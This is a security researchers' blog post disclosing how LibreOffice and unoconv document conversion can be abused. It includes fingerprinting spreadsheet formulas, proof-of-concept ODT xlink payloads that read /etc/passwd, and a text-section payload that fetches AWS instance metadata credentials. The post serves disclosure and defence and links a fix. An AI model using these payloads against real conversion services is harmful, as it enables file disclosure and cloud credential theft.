<!DOCTYPE html>
<html lang="en-US">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>A Tale of Exploitation in Spreadsheet File Conversions | Brett Buerhaus</title>
<link rel="pingback" href="https://buer.haus/xmlrpc.php">
<link rel='dns-prefetch' href='//fonts.googleapis.com' />
<link rel='dns-prefetch' href='//s.w.org' />
<link rel="alternate" type="application/rss+xml" title="Brett Buerhaus &raquo; Feed" href="https://buer.haus/feed/" />
<link rel="alternate" type="application/rss+xml" title="Brett Buerhaus &raquo; Comments Feed" href="https://buer.haus/comments/feed/" />
<link rel="alternate" type="application/rss+xml" title="Brett Buerhaus &raquo; A Tale of Exploitation in Spreadsheet File Conversions Comments Feed" href="https://buer.haus/2019/10/18/a-tale-of-exploitation-in-spreadsheet-file-conversions/feed/" />
		<script type="text/javascript">
			window._wpemojiSettings = {"baseUrl":"https:\/\/s.w.org\/images\/core\/emoji\/2.2.1\/72x72\/","ext":".png","svgUrl":"https:\/\/s.w.org\/images\/core\/emoji\/2.2.1\/svg\/","svgExt":".svg","source":{"concatemoji":"https:\/\/buer.haus\/wp-includes\/js\/wp-emoji-release.min.js?ver=4.7.2"}};
			!function(a,b,c){function d(a){var b,c,d,e,f=String.fromCharCode;if(!k||!k.fillText)return!1;switch(k.clearRect(0,0,j.width,j.height),k.textBaseline="top",k.font="600 32px Arial",a){case"flag":return k.fillText(f(55356,56826,55356,56819),0,0),!(j.toDataURL().length<3e3)&&(k.clearRect(0,0,j.width,j.height),k.fillText(f(55356,57331,65039,8205,55356,57096),0,0),b=j.toDataURL(),k.clearRect(0,0,j.width,j.height),k.fillText(f(55356,57331,55356,57096),0,0),c=j.toDataURL(),b!==c);case"emoji4":return k.fillText(f(55357,56425,55356,57341,8205,55357,56507),0,0),d=j.toDataURL(),k.clearRect(0,0,j.width,j.height),k.fillText(f(55357,56425,55356,57341,55357,56507),0,0),e=j.toDataURL(),d!==e}return!1}function e(a){var c=b.createElement("script");c.src=a,c.defer=c.type="text/javascript",b.getElementsByTagName("head")[0].appendChild(c)}var f,g,h,i,j=b.createElement("canvas"),k=j.getContext&&j.getContext("2d");for(i=Array("flag","emoji4"),c.supports={everything:!0,everythingExceptFlag:!0},h=0;h<i.length;h++)c.supports[i[h]]=d(i[h]),c.supports.everything=c.supports.everything&&c.supports[i[h]],"flag"!==i[h]&&(c.supports.everythingExceptFlag=c.supports.everythingExceptFlag&&c.supports[i[h]]);c.supports.everythingExceptFlag=c.supports.everythingExceptFlag&&!c.supports.flag,c.DOMReady=!1,c.readyCallback=function(){c.DOMReady=!0},c.supports.everything||(g=function(){c.readyCallback()},b.addEventListener?(b.addEventListener("DOMContentLoaded",g,!1),a.addEventListener("load",g,!1)):(a.attachEvent("onload",g),b.attachEvent("onreadystatechange",function(){"complete"===b.readyState&&c.readyCallback()})),f=c.source||{},f.concatemoji?e(f.concatemoji):f.wpemoji&&f.twemoji&&(e(f.twemoji),e(f.wpemoji)))}(window,document,window._wpemojiSettings);
		</script>
		<style type="text/css">
img.wp-smiley,
img.emoji {
	display: inline !important;
	border: none !important;
	box-shadow: none !important;
	height: 1em !important;
	width: 1em !important;
	margin: 0 .07em !important;
	vertical-align: -0.1em !important;
	background: none !important;
	padding: 0 !important;
}
</style>
<link rel='stylesheet' id='wp-syntax-css-css'  href='https://buer.haus/wp-content/plugins/wp-syntax/css/wp-syntax.css?ver=1.1' type='text/css' media='all' />
<link rel='stylesheet' id='big-brother-style-css'  href='https://buer.haus/wp-content/themes/big-brother-wpcom/style.css?ver=4.7.2' type='text/css' media='all' />
<link rel='stylesheet' id='big-brother-gentium-css'  href='https://fonts.googleapis.com/css?family=Gentium+Basic%3A400%2C700%2C400italic%2C700italic&#038;ver=4.7.2' type='text/css' media='all' />
<link rel='stylesheet' id='big-brother-open-sans-css'  href='https://fonts.googleapis.com/css?family=Open+Sans%3A400%2C800&#038;ver=4.7.2' type='text/css' media='all' />
<link rel='stylesheet' id='genericons-css'  href='https://buer.haus/wp-content/themes/big-brother-wpcom/genericons/genericons.css?ver=3.0.3' type='text/css' media='all' />
<script type='text/javascript' src='https://buer.haus/wp-includes/js/jquery/jquery.js?ver=1.12.4'></script>
<script type='text/javascript' src='https://buer.haus/wp-includes/js/jquery/jquery-migrate.min.js?ver=1.4.1'></script>
<link rel='https://api.w.org/' href='https://buer.haus/wp-json/' />
<link rel="EditURI" type="application/rsd+xml" title="RSD" href="https://buer.haus/xmlrpc.php?rsd" />
<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="https://buer.haus/wp-includes/wlwmanifest.xml" /> 
<link rel='prev' title='H1-5411 CTF Write-up by erbbysam and ziot' href='https://buer.haus/2018/10/08/h1-5411-ctf-write-up-by-erbbysam-and-ziot/' />
<link rel='next' title='JosieBellini’s Yours Truly Puzzle Walkthrough' href='https://buer.haus/2020/03/03/josiebellinis-yours-truly-puzzle-walkthrough/' />
<link rel="canonical" href="https://buer.haus/2019/10/18/a-tale-of-exploitation-in-spreadsheet-file-conversions/" />
<link rel='shortlink' href='https://buer.haus/?p=732' />
<link rel="alternate" type="application/json+oembed" href="https://buer.haus/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fbuer.haus%2F2019%2F10%2F18%2Fa-tale-of-exploitation-in-spreadsheet-file-conversions%2F" />
<link rel="icon" type="image/png" href="/favico.png" />
<link rel="stylesheet" type="text/css" media="screen" href="https://cdn.jsdelivr.net/gh/google/code-prettify@master/styles/sunburst.css" />
<script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/prettify/188.0.0/prettify.js"></script>
<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>

<script>
$(document).ready( function(){
    $('code').parent('pre').addClass('prettyprint');
    prettyPrint();
});
</script>

</head>

<body class="post-template-default single single-post postid-732 single-format-standard">


<script>
  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');

  ga('create', 'UA-77514149-1', 'auto');
  ga('send', 'pageview');

</script>


<div id="page" class="hfeed site">
		<header id="masthead" class="site-header clearfix" role="banner">
				<div class="site-branding">
						<h1 class="site-title"><a href="https://buer.haus/" rel="home">Brett Buerhaus</a></h1>
			<h2 class="site-description">Vulnerability disclosures, puzzle write-ups, and rambles on application security.</h2>
		</div>

		<nav id="site-navigation" class="main-navigation nav-horizontal" role="navigation">
			<h1 class="menu-toggle">Menu</h1>
			<a class="skip-link screen-reader-text" href="#content">Skip to content</a>

			<div class="menu-topnav-container"><ul id="menu-topnav" class="menu"><li id="menu-item-67" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-67"><a href="https://buer.haus/">Home</a></li>
<li id="menu-item-64" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-64"><a href="https://buer.haus/resume/">Resume</a></li>
<li id="menu-item-566" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-566"><a href="https://buer.haus/puzzles/">Puzzles</a></li>
<li id="menu-item-564" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-564"><a href="https://palisade.consulting/">Consulting / Pen. Testing Services</a></li>
<li id="menu-item-508" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-508"><a href="https://bugbountyforum.com/">Bug Bounty Forum</a></li>
<li id="menu-item-65" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-65"><a href="https://buer.haus/tools/">Tools</a></li>
</ul></div>		</nav><!-- #site-navigation -->
	</header><!-- #masthead -->

	<div id="content" class="site-content clearfix">
			<div class="breadcrumbs">
			<a class="breadcrumbs-root" href="https://buer.haus/">Home</a><span class="breadcrumbs-current">A Tale of Exploitation in Spreadsheet File Conversions</span>		</div>
		<div class="primary content-area">
		<main id="main" class="site-main" role="main">

					<div class="article-wrapper">
				
<article id="post-732" class="post-732 post type-post status-publish format-standard hentry category-uncategorized">
	<header class="entry-header">
					<h1 class="entry-title">A Tale of Exploitation in Spreadsheet File Conversions</h1>
				<div style="padding: 5px;">Author: <a href="https://twitter.com/bbuerhaus"><img width="15" height="15" alt="image" src="https://buer.haus/wp-content/uploads/ios_homescreen_icon.png"> Brett Buerhaus</a></div>
		<div class="entry-meta">
						<span class="posted-on"><a href="https://buer.haus/2019/10/18/a-tale-of-exploitation-in-spreadsheet-file-conversions/" rel="bookmark"><time class="entry-date published" datetime="2019-10-18T13:03:37+00:00">October 18, 2019</time><time class="updated" datetime="2021-04-19T14:39:48+00:00">April 19, 2021</time></a></span> <span class="byline"><span class="author vcard"><a class="url fn n" href="https://buer.haus/author/bbuerhaus/">bbuerhaus</a></span></span>
					</div><!-- .entry-meta -->
	</header><!-- .entry-header -->

	<div class="entry-content">
		<p><img src="https://buer.haus/wp-content/uploads/2019/10/blog-post-logo.png" alt="" width="683" height="226" class="aligncenter size-full wp-image-832" /></a></p>
<hr />
<p>Researchers:</p>
<ul>
<li><a href="https://twitter.com/bbuerhaus" target="_new">Brett Buerhaus</a></li>
<li><a href="https://twitter.com/daeken" target="_new">Cody Brocious (Daeken)</a></li>
<li><a href="https://twitter.com/erbbysam" target="_new">Sam Erb (erbbysam)</a></li>
<li><a href="https://twitter.com/smiegles" target="_new">Olivier Beg (Smiegles)</a></li>
</ul>
<hr />
<h1><strong>Intro</strong></h1>
<p>In our attempt to fingerprint LibreOffice as a PDF rendering service, we identified multiple implementation vulnerabilities. </p>
<p>This writeup covers our efforts to fingerprint LibreOffice, LibreOffice file detection (and abuse) & misuse of the LibreOffice Python-UNO bridge.</p>
<p>The unintended misuse of the Python-UNO bridge by the popular package unoconv resulted in <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-17400" target="_new">CVE-2019-17400</a>.</p>
<p>We believe our research here is not final, and encourage others to look into this area.</p>
<p><span id="more-732"></span></p>
<p>&nbsp;</p>
<hr />
<h1><strong>LibreOffice</strong></h1>
<p>LibreOffice is an open-source fork of OpenOffice and with some google searches you can see there are <a href="https://www.libreoffice.org/about-us/security/advisories/" target="_new">several critical CVEs</a> for it from the past few weeks alone. LibreOffice's Github project has over 500k commits including code that has not been updated in many years. Many companies rely on using LibreOffice to export common document formats to HTML/PDF due to it allowing headless file conversions.</p>
<hr />
<h1><strong>Fingerprinting the Spreadsheet Converter</strong></h1>
<p>We used the following two methods to identify & fingerprint the document rendering service on multiple websites.</p>
<h2> The INFO Functions</h2>
<p>Most spreadsheet specs, such as XLSX or ODS, provide you with the INFO functions to give you some information about the software or system that opened the spreadsheet. </p>
<p>An important observation to note here is that many websites we came across allowed for any LibreOffice support file type to be rendered, despite limiting file extensions client-side. This allowed us to test XLSX uploads. (more on this below)</p>
<p><a href="http://buer.haus/wp-content/uploads/2019/08/info.png"><img class="aligncenter size-full wp-image-763" src="http://buer.haus/wp-content/uploads/2019/08/info.png" alt="" width="1009" height="425" /></a></p>
<p>This is a useful identifier for a few reasons. The =INFO("osversion") function has a hard-coded value for OpenOffice/LibreOffice. OpenOffice and older versions of Libre return an error for INFO functions it does not support where LibreOffice after 2015 will display "#N/A". These small nuances provide the opportunity to create an XLSX file that can be used to get a better idea of what is processing the spreadsheets on the server.</p>
<p>Here are the fingerprints we ended up using:</p>
<p>Where cell c4 is <strong>=INFO("DIRECTORY")</strong></p>
<table>
<tr>
<td>Label</td>
<td>Function</td>
</tr>
<tr>
<td>Is OpenOffice -or- Libre prior to 2015?</td>
<td> =IF(ISNUMBER(SEARCH("Err:502",C4)), "True", "False")</td>
</tr>
<tr>
<td>Is LibreOffice?</td>
<td> =IF(ISNUMBER(SEARCH("#",C4)), "True", "False")</td>
</tr>
<tr>
<td>Is Excel?</td>
<td> =IF(ISNUMBER(SEARCH("\",C4)), "True", "False")</td>
</tr>
</table>
<p>The check on OpenOffice is due to Libre's fork off of OpenOffice and eventually adding a resulting #N/A if you call an Excel INFO function that is not supported by OO/Libre. This was added in this commit: <a href="https://github.com/LibreOffice/core/commit/db6a928a420868b2a80ba11c8d46151d16c13624">https://github.com/LibreOffice/core/commit/db6a928a420868b2a80ba11c8d46151d16c13624</a>. So there is no guarantee, but it could be useful in determining whether you might want to try some older Libre CVEs or not.</p>
<p>Also worth noting is that recently Libre started to put a git hash as their version, so <strong>INFO("release")</strong> will help you find the exact versions of the software being used.</p>
<p>In addition to fingerprinting the app doing the conversion, it will also tell you a few other things. A useful one is the OSVERSION as it will tell you the operating system behind it (WIN, LINUX, SOLARIS) which could be useful recon data for tailoring exploits to the server. Another useful one specific to Excel is DIRECTORY which tells you the current working directory giving you a bit of a path disclosure or Windows username depending on the file location.</p>
<h2>PDF Metadata</h2>
<p>Due to most of the applications using OpenOffice/LibreOffice to export XLSX/DOCX to PDF, if the application delivers you a raw PDF back from the conversion, it will likely contain metadata such as the version of LibreOffice being used.<br />
This was the case with Slack, e.g.</p>
<pre><code>https://files.slack.com/files-pri/[filehash]/download/asdf.odt_converted.pdf</code></pre>
<p>Resulted in:</p>
<p><a href="http://buer.haus/wp-content/uploads/2019/08/pdf-metadata.png"><img class="aligncenter size-full wp-image-760" src="http://buer.haus/wp-content/uploads/2019/08/pdf-metadata.png" alt="" width="610" height="369" /></a></p>
<p>&nbsp;</p>
<hr />
<h1>A Common Extension Pitfall</h1>
<p>During our initial testing, we observed one website that would only render documents with an .xlsx extension. This website would then render the file using LibreOffice. We then created an ODS document and renamed it to use an XLSX extension instead. Poof! It was now returning the preview of the ODS document.<br />
This is the entry point for exploitation of Open/LibreOffice conversions.</p>
<p><strong>Some applications are taking files you upload with XLSX or DOCX extensions and passing them into OpenOffice without performing strong file format validation or configuring filters safely.</strong> When these files are handed off for conversion, the conversion flow used is determined by file contents rather than extension.</p>
<hr />
<h1>LibreOffice/OpenOffice File Detection</h1>
<p><strong>Please note that we do not have high confidence in our code analysis.</strong></p>
<p>When you pass files through <strong>soffice</strong> with the <strong>--convert-to</strong> and <strong>--headless</strong> arguments, it runs through a flow of code to determine what type of file you are passing into it. In our research, a vast majority of these are outputting to PDF which can be summarized with this flow:</p>
<ul>
<li>If no hard filter is specified, it tells it to guess the file format</li>
<li>It checks the file extension of the file passed into it</li>
<li>It checks a filter based on the file contents (such as magic headers)</li>
<li>It has a list of file formats it supports and ranks them based on complexity. For example, it'll work on detecting if it's a complex XML format such as docbook before falling back to XML or HTML.</li>
<li>If the extension and filter do not match, it falls back to relying solely on the filter guess</li>
</ul>
<p><a href="https://github.com/LibreOffice/core/blob/master/desktop/source/app/dispatchwatcher.cxx#L595">https://github.com/LibreOffice/core/blob/master/desktop/source/app/dispatchwatcher.cxx#L595</a></p>
<pre><code>OUString aParam = aDispatchRequest.aPrinterName;
sal_Int32 nFilterIndex = aParam.indexOf( ':' );

bool bGuess = false;

if( nFilterIndex >= 0 ) {
    ...
} else {
    // Guess
    bGuess = true;
    aFilterExt = aParam.copy( 0, nPathIndex );
}</code></pre>
<p>If a filter is not specified in the URI, it enables the guess file format flow.</p>
<pre><code>if ( bGuess ) {
    ...
    aFilter = impl_GuessFilter( aOutFile, aDocService );
}

OUString impl_GuessFilter( const OUString& rUrlOut, const OUString& rDocService ) {
    std::shared_ptr<const SfxFilter> pOutFilter = impl_getExportFilterFromUrl( rUrlOut, rDocService );
    ...
}

std::shared_ptr<const SfxFilter> impl_getExportFilterFromUrl( const OUString& rUrl, const OUString& rFactory) {
    try {
        const Reference< XComponentContext > xContext( comphelper::getProcessComponentContext() );
        const Reference< document::XTypeDetection > xTypeDetector( xContext->getServiceManager()->createInstanceWithContext( "com.sun.star.document.TypeDetection", xContext ), UNO_QUERY_THROW );
        const OUString aTypeName( xTypeDetector->queryTypeByURL( rUrl ) );</code></pre>
<p>At this point, it's relying on a set of configurable filters based on <a href="https://www.openoffice.org/api/docs/common/ref/com/sun/star/document/TypeDetection.html">com.sun.star.document.TypeDetection</a>. These filters are used to determine file type, which can be roughly summarized as checking for magic header bytes or hard-coded strings in the file contents. That means if you are taking in word docs or spreadsheets and exporting to PDF, it will completely negate the docx or xlsx extensions and guess what the file format if it does not detect the xlsx or docx file headers.</p>
<p>Here is an example of Encapsulated PostScript (EPFS):</p>
<ul>
<li>The filter: <a href="https://github.com/LibreOffice/core/blob/master/filter/source/config/fragments/types/eps_Encapsulated_PostScript.xcu" target="_new">https://github.com/LibreOffice/core/blob/master/filter/source/config/fragments/types/eps_Encapsulated_PostScript.xcu<br />
</a></li>
<li>The check: <a href="https://github.com/LibreOffice/core/blob/master/vcl/source/filter/GraphicFormatDetector.cxx#L322" target="_new">https://github.com/LibreOffice/core/blob/master/vcl/source/filter/GraphicFormatDetector.cxx#L322</a></li>
</ul>
<pre><code>bool GraphicFormatDetector::checkEPS()
{
    if ((mnFirstLong == 0xC5D0D3C6)
        || (ImplSearchEntry(maFirstBytes.data(), reinterpret_cast("%!PS-Adobe"),
                            10, 10)
            &amp;&amp; ImplSearchEntry(&amp;maFirstBytes[15], reinterpret_cast("EPS"), 3, 3)))
    {
        msDetectedFormat = "EPS";
        return true;
    }
    return false;
}</code></pre>
<p>As you can see you cannot just throw `PS-Adobe` in a text file and convert it. It is also checking if `EPS` follows after the PS-Adobe header. Once you determine how the file detection is taking place for specific file formats, you can start to exploit that file format if the conversion taking place allows it.</p>
<hr />
<h2>File Formats Supported By LibreOffice</h2>
<p>The file formats supported by LibreOffice is around 100. There are far too many to cover, so I'll leave the link to the Wiki table here:</p>
<p><a href="https://en.wikipedia.org/wiki/LibreOffice#Supported_file_formats" target="_new">https://en.wikipedia.org/wiki/LibreOffice#Supported_file_formats</a></p>
<p>You'll need to click the "Show" link to expand the table.</p>
<hr />
<h1>Ghost(script) in the Excel</h1>
<p>One of the first things that jumped out to us in the supported file formats is that LibreOffice supports EPFS which means PostScript/Ghostscript. There have been some fun exploits in Ghostscript the past few years and it's also one of the only file formats supported (that we could identify) that allows some raw scripting to interact with files or execute commands.</p>
<p>Using a Ghostscript payload, we were able to achieve file read and write.</p>
<p>The code for this payload can be found here:</p>
<ul>
<li><a href="https://gist.github.com/ziot/fb96e97baae59e3539ac3cdacbd09430" target="_new">https://gist.github.com/ziot/fb96e97baae59e3539ac3cdacbd09430</a></li>
</ul>
<p>Credits to <a href="https://twitter.com/daeken" target="_new">Cody Brocious (daeken)</a> for getting the Ghostscript payload working.</p>
<p>One thing we learned about LibreOffice is that although EPFS files were being processed by LibreOffice, there was no guarantee that it would lead to Ghostscript. This is due to a hierarchy system of EPFS parsing:</p>
<pre>pstoedit, convert (a part of ImageMagick), and GhostScript (gs or gswin32c) are tried in that order on all platforms. The first one that is available will be used to render the preview</pre>
<p>More information on that flow here:</p>
<ul>
<li><a href="https://github.com/LibreOffice/core/blob/master/filter/source/graphicfilter/ieps/ieps.cxx" target="_new">https://github.com/LibreOffice/core/blob/master/filter/source/graphicfilter/ieps/ieps.cxx</a></li>
</ul>
<p>But, EPFS just hands off postscript to other applications, there is no guarantee that there is a binary on the system that will handle the postscript you pass into it. In these cases, you need to find an alternative route for exploitation.</p>
<hr />
<h1>Slack, OLE Objects, and Text Sections</h1>
<p>With the LibreOffice fingerprint spreadsheet file, we started to check other websites that may also use LibreOffice in a similar way. We accidentally discovered that Slack is using LibreOffice (while sharing files using Slack...). Our LFI Ghostscript payload did not work, so we had to find a different exploit chain with Libre.</p>
<p>Below we go over the specific details of the OLE Object xLinks and Text Section exploits we used to read local file contents and capture AWS credentials.</p>
<hr />
<h1>LFD/SSRF - Remote OLE Object xLinking</h1>
<p>This is akin to the <a href="https://www.exploit-db.com/exploits/44022" target="_new">=WEBSERVICE LFD/SSRF vulnerability (CVE-2018-6871)</a>. In LibreOffice documents you are able to embed OLE Objects inside of the documents. This also supports remote objects that update when the document is opened. Although LibreOffice docs contain some features that may allow this, such as floating frames (conversions of iframes), you may not get them to render when converted to a PDF document.</p>
<p>OLE Objects in LibreOffice work by fetching the contents of the remote URL and displaying the contents inside of a frame. The OLE objects are embedded in the <strong>content.xml</strong> of the LibreOffice files. <strong>By default, these x-href links will not update on conversion.</strong> In fact, in OpenOffice/LibreOffice, most of the time you need to enable link updates manually after you open the document. This brings us to the popular Universal Office Converter (unoconv), but more on that later in the blog post.</p>
<p>As long as x-href updates are enabled, you will be able to fetch arbitrary contents. This can be seen by creating the following PoC:</p>
<h3>PoC Steps</h3>
<ol>
<li>Create a new spreadsheet in LibreOffice</li>
<li>Insert -&gt; object -&gt; ole object -&gt; create from file</li>
<li>Checkbox "link to file"</li>
<li>Enter a url to an actual file (libre will fail on a 404)</li>
<li>Save the odt file</li>
<li>Open the odt file with zip tool like 7zip</li>
<li>Modify content.xml, replacing the url with "file:///etc/passwd".
<ul>
<li>* find: `&lt;draw:object xlink:href="https://[your server]/[your file]" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/&gt;`</li>
<li>* replace: `&lt;draw:object xlink:href="file:///etc/passwd" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/&gt;`</li>
</ul>
</li>
<li>Replace the content.xml in the odt file with your newly edited one</li>
<li>Rename file to test.odt.xlsx</li>
<li>Upload to a vulnerable web server that processes the document.</li>
<li>---&gt; You can see the contents of /etc/passwd.</li>
</ol>
<p>If you view content.xml in the OpenOffice file format (zip), the OLE object works like the following:</p>
<pre><code>&lt;draw:frame draw:style-name="fr1" draw:name="Object1" text:anchor-type="paragraph" svg:width="6.6925in" svg:height="1.1791in" draw:z-index="0"&gt;&lt;draw:object xlink:href="file:///etc/passwd" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/&gt;&lt;draw:image xlink:href="./ObjectReplacements/Object 1" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/&gt;&lt;/draw:frame&gt;</code></pre>
<p>The xlink:href is fetched when the document is converted based on the xlink:actuate <strong>onLoad</strong> trigger.</p>
<p>However, there is a problem with this vector. OLE Objects with remote links update when the document is opened and this resets the formatting. The default formatting will only allow you to view 2-3 lines of text. There may be a way to circumvent this, but after many failed attempts we decided to look for an alternative.</p>
<p><a href="http://buer.haus/wp-content/uploads/2019/08/etc-ole.png"><img class="aligncenter size-full wp-image-762" src="http://buer.haus/wp-content/uploads/2019/08/etc-ole.png" alt="" width="1238" height="661" /></a></p>
<hr />
<p>&nbsp;</p>
<h1>SSRF and LFD with Text Sections</h1>
<p>After reading the documentation, we discovered that OFD files have a features that support the xlink hrefs as well.</p>
<p>Source: <a href="http://www.datypic.com/sc/odf/a-xlink_href.html">http://www.datypic.com/sc/odf/a-xlink_href.html</a></p>
<p>One of these features is called <strong><a href="http://www.datypic.com/sc/odf/e-text_section-source.html">text sections</a>. </strong>From here we were able to construct a payload that allowed arbitrary read in a default styling that displayed the full contents. This feature also allows the same file:// access as OLE objects..</p>
<pre><code>&lt;office:text&gt;
    &lt;text:section text:name="string"&gt;
        &lt;text:section-source xlink:href="http://169.254.169.254/latest/meta-data/ xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/&gt;
    &lt;/text:section&gt;
&lt;/office:text&gt;</code></pre>
<p>From here we got what we needed:</p>
<p><a href="http://buer.haus/wp-content/uploads/2019/08/aws-keys.png"><img class="aligncenter size-full wp-image-765" src="http://buer.haus/wp-content/uploads/2019/08/aws-keys.png" alt="" width="838" height="516" /></a></p>
<p>This exploit ended up working on another program, but it is one that we are unable to disclose. So text-sections are a good test to try if Ghostscript fails, but remember that it relies on link updates to be enabled whether manually in commandline or via a library that explicitly forces links to update.</p>
<hr />
<h1>Universal Office Converter aka the unoconv pyuno rabbit-hole</h1>
<p>Project Repository: <a href="https://github.com/unoconv/unoconv" target="_new">https://github.com/unoconv/unoconv</a></p>
<pre>Description: Universal Office Converter (unoconv) is a command line tool to convert any document format that LibreOffice can import to any document format that LibreOffice can export. It makes use of the LibreOffice’s UNO bindings for non-interactive conversion of documents.</pre>
<p>In the case of Slack and a few others, the problem was their usage of libraries that used unoconv. Although at its core it is just a service that sits on top of Libre and OpenOffice.</p>
<p>After reviewing the unoconv code, we realized that it's using a bridge in order to access OpenOffice API's in Python. This took us down even further into the rabbit-hole. Welcome to the <a href="https://wiki.openoffice.org/wiki/PyUNO_bridge" target="_new">PyUNO Bridge</a>.</p>
<p>Info:</p>
<ul>
<li><a href="https://wiki.openoffice.org/wiki/PyUNO_bridge">https://wiki.openoffice.org/wiki/PyUNO_bridge</a></li>
<li><a href="https://github.com/LibreOffice/core/blob/master/pyuno/">https://github.com/LibreOffice/core/blob/master/pyuno/</a></li>
</ul>
<p>The vulnerability in x-href links ended up being caused by unoconv's silent updating of external links. </p>
<p><a href="https://github.com/unoconv/unoconv/blob/master/unoconv#L972" target="_new">https://github.com/unoconv/unoconv/blob/master/unoconv#L972</a></p>
<pre><code>            inputprops = UnoProps(Hidden=True, ReadOnly=True, UpdateDocMode=QUIET_UPDATE)</code></pre>
<p><a href="https://www.openoffice.org/api/docs/common/ref/com/sun/star/document/MediaDescriptor.html#UpdateDocMode" target="_new">https://www.openoffice.org/api/docs/common/ref/com/sun/star/document/MediaDescriptor.html#UpdateDocMode</a></p>
<p>If you look into the UpdateDocMode, you'll see that QUIET_UPDATE specifies the following: "Update document if it does not require a dialog. Otherwise do not update. For example a link to a database can require a dialog to get password for an update.". Updating external links has a button you press as a security concern, but it is not considered a required dialog option. Thus unoconv will silently update all external links during the conversion process.</p>
<p>Unoconv also has an “updateLinks” phase as well which would also update the document with remote links: <a href="https://github.com/unoconv/unoconv/blob/release-0.8/unoconv#L986" target="_new">https://github.com/unoconv/unoconv/blob/release-0.8/unoconv#L986</a> (<strong>warning: old branch</strong>)</p>
<p>We worked a maintainer for unoconv to modify the default behavior to a safer option: <a href="https://github.com/unoconv/unoconv/pull/510" target="_new">https://github.com/unoconv/unoconv/pull/510</a></p>
<p>This has been integrated into unoconv 0.9.</p>
<hr />
<h1>OpenOffice Macro CVEs</h1>
<p>You might be pointing out that LibreOffice has a lot of CVEs, some of them that automatically execute basic or Python code via the macro system. These have been found a couple of times, even quite recent to our research with <a href="https://www.andreafortuna.org/2019/07/27/cve-2019-9848-unpatched-flaw-in-libreoffice-allows-malicious-code-execution/" target="_new">CVE 2019-9848</a>.</p>
<p>It's important to note that our research and attacks are purely taking place in the conversion process of a headless OpenOffice or Libre binary. The binary we are focusing on is <strong>soffice</strong> with the <strong>--headless</strong> launch argument & <strong>uonconv/PyUNO</strong>.</p>
<p>In our testing we found that these exploits did not work during conversion or when a preview of the document is generated. We don't know the specifics of this, but it looks like event handlers or macros are not executed directly when LibreOffice is running in --headless or --invisible mode.</p>
<hr />
<h1>Closing Thoughts</h1>
<p>To recap our findings on LibreOffice -- EPSF rendering can hit Ghostscript in uncommon circumstances & it is not safe to silently update links in a document you do not trust.<br />
LibreOffice has had many CVEs in the past, some of them very similar to what we are writing about in this blog post. The concept of an LFD, SSRF, or even RCE via macros is nothing that has not been seen before. The takeaway is that there are many websites relying on libraries that are complex and filled with many nuances that may get lost or not seen when implementing them into applications.</p>
<p>Some companies are openly parsing libre documents directly and others are making mistakes passing certain extensions into libre on accident. However, some of them are relying on sandboxing and/or jails to prevent meaningful exploitation even if you execute code in that environment. </p>
<p>We would like to encourage any developer reading this to sandbox document parsing / PDF rendering as much as possible. We believe the risk here can be considered comparable to image processing with ImageMagick (see <a href="https://imagetragick.com/" target="_new">ImageTragick</a>).</p>
<p>Going forward, it would be interesting to see more research on:</p>
<ul>
<li>Oasis file spec</li>
<li>LibreOffice/OpenOffice file detection and parsing</li>
<li>Implementation of PyUNO Bridge and OpenOffice API calls</li>
<li>Any vulnerability in the common code path used by the --headless conversion process would likely impact every use of LibreOffice online</li>
</ul>
			</div><!-- .entry-content -->

	<footer class="entry-meta">
			</footer><!-- .entry-meta -->
</article><!-- #post-## -->
			</div>

				<nav role="navigation" id="nav-below" class="post-navigation">
		<h1 class="screen-reader-text">Post navigation</h1>

	
		<div class="nav-previous"><a href="https://buer.haus/2018/10/08/h1-5411-ctf-write-up-by-erbbysam-and-ziot/" rel="prev"><span class="meta-nav">&larr;</span> H1-5411 CTF Write-up by erbbysam and ziot</a></div>		<div class="nav-next"><a href="https://buer.haus/2020/03/03/josiebellinis-yours-truly-puzzle-walkthrough/" rel="next">JosieBellini’s Yours Truly Puzzle Walkthrough <span class="meta-nav">&rarr;</span></a></div>
	
	</nav><!-- #nav-below -->
	
			
		
		</main><!-- #main -->
	</div><!-- #primary -->

					<div class="secondary widget-area" role="complementary">
			<aside id="search-2" class="widget widget_search"><form role="search" method="get" class="search-form" action="https://buer.haus/">
	<label>
		<span class="screen-reader-text">Search for:</span>
		<input type="search" class="search-field" placeholder="Search &hellip;" value="" name="s">
	</label>
	<input type="submit" class="search-submit" value="Search">
</form>
</aside><aside id="text-3" class="widget widget_text"><h1 class="widget-title">Twitter Feed</h1>			<div class="textwidget"><a class="twitter-timeline"  href="https://twitter.com/bbuerhaus" data-widget-id="566159402986520576">Tweets by @bbuerhaus</a>
            <script>!function(d,s,id){var js,fjs=d.getElementsByTagName(s)[0],p=/^http:/.test(d.location)?'http':'https';if(!d.getElementById(id)){js=d.createElement(s);js.id=id;js.src=p+"://platform.twitter.com/widgets.js";fjs.parentNode.insertBefore(js,fjs);}}(document,"script","twitter-wjs");</script></div>
		</aside><aside id="tag_cloud-3" class="widget widget_tag_cloud"><h1 class="widget-title">Tags</h1><div class="tagcloud"><a href='https://buer.haus/tag/1o57/' class='tag-link-45 tag-link-position-1' title='2 topics' style='font-size: 10.863636363636pt;'>1o57</a>
